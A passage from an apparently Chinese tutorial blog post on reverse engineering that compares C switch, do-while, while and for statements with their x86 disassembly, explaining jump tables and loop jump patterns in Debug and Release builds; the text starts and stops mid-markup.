src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261718094.png" alt="image-20211226171819013"></p><p>如图，展示了大表存储跳转表的地址</p><p>可知     jmp [寄存器*4 + 0xxxxx] ;跳转表模式的重要特征</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">233</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;233&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Function(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">4</span>:        <span class="hljs-keyword">switch</span>(x)<br><span class="hljs-number">5</span>:        &#123;<br><span class="hljs-number">0040</span>D898   mov         eax,dword ptr [ebp+<span class="hljs-number">8</span>]<br><span class="hljs-number">0040</span>D89B   mov         dword ptr [ebp<span class="hljs-number">-4</span>],eax<br><span class="hljs-number">0040</span>D89E   mov         ecx,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8A1   sub         ecx,<span class="hljs-number">1</span><br><span class="hljs-number">0040</span>D8A4   mov         dword ptr [ebp<span class="hljs-number">-4</span>],ecx<br><span class="hljs-number">0040</span>D8A7   cmp         dword ptr [ebp<span class="hljs-number">-4</span>],<span class="hljs-number">0E8</span>h<br><span class="hljs-number">0040</span>D8AE   ja          $L548+<span class="hljs-number">0F</span>h (<span class="hljs-number">0040</span>d950)<br><span class="hljs-number">0040</span>D8B4   mov         eax,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8B7   <span class="hljs-keyword">xor</span>         edx,edx<br><span class="hljs-number">0040</span>D8B9   mov         dl,<span class="hljs-function">byte <span class="hljs-title">ptr</span>  <span class="hljs-params">(<span class="hljs-number">0040</span>d996)</span>[eax]</span><br><span class="hljs-function">0040D8BF   jmp         dword ptr [edx*4+40D96Eh]    <span class="hljs-comment">//计算出跳转表的地址 然后 根据跳转存储的值 跳转到 case语句部分</span></span><br><span class="hljs-function">6:        <span class="hljs-keyword">case</span> 1:</span><br><span class="hljs-function">7:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;1&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8C6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;1&quot;</span> (<span class="hljs-number">0042203</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D8CB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8D0   add         esp,4</span><br><span class="hljs-function">0040D8D3   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">8:        <span class="hljs-keyword">case</span> 2:</span><br><span class="hljs-function">9:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;2&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8D8   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;2&quot;</span> (<span class="hljs-number">00422038</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8DD   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8E2   add         esp,4</span><br><span class="hljs-function">0040D8E5   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">10:       <span class="hljs-keyword">case</span> 3:</span><br><span class="hljs-function">11:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;3&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8E7   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;3&quot;</span> (<span class="hljs-number">00422034</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8EC   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8F1   add         esp,4</span><br><span class="hljs-function">0040D8F4   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">12:       <span class="hljs-keyword">case</span> 4:</span><br><span class="hljs-function">13:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;4&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8F6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;4&quot;</span> (<span class="hljs-number">00422030</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8FB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D900   add         esp,4</span><br><span class="hljs-function">0040D903   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">14:       <span class="hljs-keyword">case</span> 5:</span><br><span class="hljs-function">15:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;5&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D905   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;5&quot;</span> (<span class="hljs-number">0042202</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D90A   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D90F   add         esp,4</span><br><span class="hljs-function">0040D912   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">16:</span><br><span class="hljs-function">17:       <span class="hljs-keyword">case</span> 233:</span><br><span class="hljs-function">18:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;233&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D914   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;12&quot;</span> (<span class="hljs-number">0042201</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D919   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D91E   add         esp,4</span><br><span class="hljs-function">0040D921   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">19:</span><br><span class="hljs-function">20:       <span class="hljs-keyword">case</span> 7:</span><br><span class="hljs-function">21:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;7&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D923   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;7&quot;</span> (<span class="hljs-number">00422028</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D928   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D92D   add         esp,4</span><br><span class="hljs-function">0040D930   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">22:       <span class="hljs-keyword">case</span> 8:</span><br><span class="hljs-function">23:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;8&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D932   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;10&quot;</span> (<span class="hljs-number">00422024</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D937   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D93C   add         esp,4</span><br><span class="hljs-function">0040D93F   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">24:       <span class="hljs-keyword">case</span> 9:</span><br><span class="hljs-function">25:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;9&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D941   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;11&quot;</span> (<span class="hljs-number">00422020</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D946   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D94B   add         esp,4</span><br><span class="hljs-function">0040D94E   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">26:       <span class="hljs-keyword">default</span>:</span><br><span class="hljs-function">27:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;error&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D950   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;error&quot;</span> (<span class="hljs-number">00422f</span>cc)<br><span class="hljs-number">0040</span><span class="hljs-function">D955   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D95A   add         esp,4</span><br><span class="hljs-function">28:</span><br><span class="hljs-function">29:       &#125;</span><br><span class="hljs-function">30:   &#125;</span><br></code></pre></td></tr></table></figure><h3 id="dowhile"><a href="#dowhile" class="headerlink" title="dowhile"></a>dowhile</h3><p>特点：</p><p>​    向上跳转（分支语句都是向上跳转）</p><p>​    跳转条件不反写</p><p>​    只用一次跳转，效率最高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> <br>    &#123;<br>        nSum = nSum + i;<br>    &#125; <span class="hljs-keyword">while</span> (i &lt;=<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main       <span class="hljs-comment">//main开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>  <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span><br>.text:<span class="hljs-number">0000000000401572</span> loc_401572:                             ; CODE XREF: main+<span class="hljs-number">2</span>C↓j<br>.text:<span class="hljs-number">0000000000401572</span>                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">0000000000401575</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a=a+b</span><br>.text:<span class="hljs-number">0000000000401578</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <br>.text:<span class="hljs-number">000000000040157</span>C                 jle     <span class="hljs-keyword">short</span> loc_401572     <br>.text:<span class="hljs-number">000000000040157</span>E                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401583</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401587</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401588</span>                 retn<br>.text:<span class="hljs-number">0000000000401588</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>​    while 要先比较，再跳转，一共两次，效率较低 其中第一次跳转其地址是往增量跳转,第二次跳转其地址是往减量地址跳转</p><p>​    Release版本下</p><p>　　1.常量传播的优化方式下,其代码会变成do while执行</p><p>　　2.代码外提的情况下,其代码会变成if 包含 do while执行,其中代码的条件外提.注意,函数不可以作为代码外提</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= <span class="hljs-number">100</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>    <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span>                 jmp     <span class="hljs-keyword">short</span> loc_40158B<br>.text:<span class="hljs-number">0000000000401574</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401574</span><br>.text:<span class="hljs-number">0000000000401574</span> loc_401574:                             ; CODE XREF: main+<span class="hljs-number">3F</span>↓j<br>.text:<span class="hljs-number">0000000000401574</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401577</span>                 mov     edx, eax<br>.text:<span class="hljs-number">0000000000401579</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span>  <span class="hljs-comment">//printf(&#x27;%d&#x27;,a);</span><br>.text:<span class="hljs-number">0000000000401580</span>                 call    <span class="hljs-built_in">printf</span>      <br>.text:<span class="hljs-number">0000000000401585</span>                 mov     eax, [rbp+var_8]   <span class="hljs-comment">//a+b</span><br>.text:<span class="hljs-number">0000000000401588</span>                 add     [rbp+var_4], eax<br>.text:<span class="hljs-number">000000000040158B</span><br>.text:<span class="hljs-number">000000000040158B</span> loc_40158B:                             ; CODE XREF: main+<span class="hljs-number">22</span>↑j<br>.text:<span class="hljs-number">000000000040158B</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <span class="hljs-comment">//while(b&lt;100)</span><br>.text:<span class="hljs-number">000000000040158F</span>                 jle     <span class="hljs-keyword">short</span> loc_401574   <span class="hljs-comment">//小于执行loc_401574</span><br>.text:<span class="hljs-number">0000000000401591</span>                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">0000000000401594</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401598</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401599</span>                 retn<br>.text:<span class="hljs-number">0000000000401599</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>​    for 需要三次跳转：1赋初值后要跳过步长 2循环条件的比较 3代码块执行完要跳回到步长（for也 可以转换为do）</p><p>​    for循环因为有步长的问题,所以多一次跳转. 其中 第一步跳转到 条件位置处,第二此跳转则判断条件是否成立,不成立则退出,此时找到for的下界,当前位置可以当做if的上界.</p><p>​    条件成立之后代码继续执行,则此时又来了一次跳转,此跳转跳转到步长执行代码</p><p>Release版本下</p><p>　　1.常量传播方式下 代码变为do while执行</p><p>　　2.代码外提情况下,代码变成了 if + do while的形式　</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>;i++) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><h4 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span 